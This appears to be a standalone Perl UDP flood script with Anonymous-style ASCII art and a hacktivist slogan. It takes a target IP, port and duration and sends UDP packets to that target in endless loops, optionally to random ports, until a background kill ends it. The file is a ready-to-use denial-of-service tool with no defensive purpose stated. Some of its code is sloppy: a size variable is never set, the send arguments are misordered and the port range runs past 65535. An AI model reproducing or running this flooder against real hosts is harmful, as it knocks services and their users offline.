#!/usr/bin/perl
use Socket;
$ARGC=@ARGV;
if ($ARGC !=3) {
printf "[0;31m [0;31mComanda este : [0;31m perl $0 ip port time [0;31m[0m\n";
exit(1);
}
my ($ip,$port,$size,$time);
$ip=$ARGV[0];
$port=$ARGV[1];
$time=$ARGV[2];
socket(crazy, PF_INET, SOCK_DGRAM, 17);
$iaddr = inet_aton("$ip");



printf "[0;31m MMMMMMMMMMMMMMMMMMMNmdhhyysssooossyyhmNMMMMMMMMMMMMMMMM \n";
printf "[0;31m MMMMMMMMMMMMMmyo/-`.----..----:-.-----..-/sNMMMMMMMMMMM \n";
printf "[0;31m MMMMMMMMMNs:`.:/+o/:-.``              `... :MMMMMMMMMMM \n";
printf "[0;31m MMMMMMMMM: smdyo//-.`                     . hMMMMMMMMMM \n";
printf "[0;31m MMMMMMMMM`-MNds+:-.`                      ``-MMMMMMMMMM \n";
printf "[0;31m MMMMMMMMm +NNhs+/::.`        `..``````     - dMMMMMMMMM \n";
printf "[0;31m MMMMMMMMh oNmssdhyo+:`      ``.:shyyss+/` `- sMMMMMMMMM \n";
printf "[0;31m MMMMMMMMy sNms:--:odmNh-    .ymNy/.`    .`.: sMMMMMMMMM \n";
printf "[0;31m MMMMMMMMy ymho.`   `-+y/    .oo.          -: oMMMMMMMMM \n";
printf "[0;31m MMMMMMMMd odho+osyyo+::++.   ..-+shdhho`...- +MMMMMMMMM \n";
printf "[0;31m MMMMMMMMN`:hy+/+oo++/+++/-    .-://:.`   `.: oMMMMMMMMM \n";
printf "[0;31m MMMMMMMMM..d+````   `:+++:           ```  `: hMMMMMMMMM \n";
printf "[0;31m MMMMMMMMM: mo:...`  .+ooo/          `...  .- mMMMMMMMMM \n";
printf "[0;31m MMMMMMMMMy sd:```  ./syss-     .`   ```  `:-`MMMMMMMMMM \n";
printf "[0;31m MMMMMMMMMN`-ho/://ohmdyys.   -.-````.-::..+ /MMMMMMMMMM \n";
printf "[0;31m MMMMMMMMMMo s+shNhosso+smdyys-     .oy./ :: hMMMMMMMMMM \n";
printf "[0;31m MMMMMMMMMMM-`s/ysNNmhyhNMh-sdyo+/ohh+ . ::`.MMMMMMMMMMM \n";
printf "[0;31m MMMMMMMMMMMN: //oo+ssssso:--:+/::-`  . .:- hMMMMMMMMMMM \n";
printf "[0;31m MMMMMMMMMMMMM+ /+:++yo:/:-...``     ` .:. sMMMMMMMMMMMM \n";
printf "[0;31m MMMMMMMMMMMMMMy`.o/sss/-.sNds        -:`.dMMMMMMMMMMMMM \n";
printf "[0;31m MMMMMMMMMMMMMMMm: +y+yo++sMy/    ` `:- /NMMMMMMMMMMMMMM \n";
printf "[0;31m MMMMMMMMMMMMMMMMMh-`:yyyyNmh+   ` `-`.hMMMMMMMMMMMMMMMM \n";
printf "[0;31m MMMMMMMMMMMMMMMMMMMd/`-oymds:   ```-sMMMMMMMMMMMMMMMMMM \n";
printf "[0;31m MMMMMMMMMMMMMMMMMMMMMNo`.+Ny:`.` :dMMMMMMMMMMMMMMMMMMMM \n";
printf "[0;31m MMMMMMMMMMMMMMMMMMMMMMMNs`-o`./smMMMMMMMMMMMMMMMMMMMMMM \n";
printf "[0;31m MMMMMMMMMMMMMMMMMMMMMMMMMNyyyNMMMMMMMMMMMMMMMMMMMMMMMMM \n";
printf "[0;32m     We do not forgive. We do not forget. Expect us      \n";

if ($ARGV[1] ==0 && $ARGV[2] ==0) {
goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &"); 
goto randpackets;
}
packets:
for (;;) {
$size=$rand x $rand x $rand;
send(crazy, 8, $size, sockaddr_in($port, $iaddr));
}
randpackets:
for (;;) {
$size=$rand x $rand x $rand;
$port=int(rand 79500) +0;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}
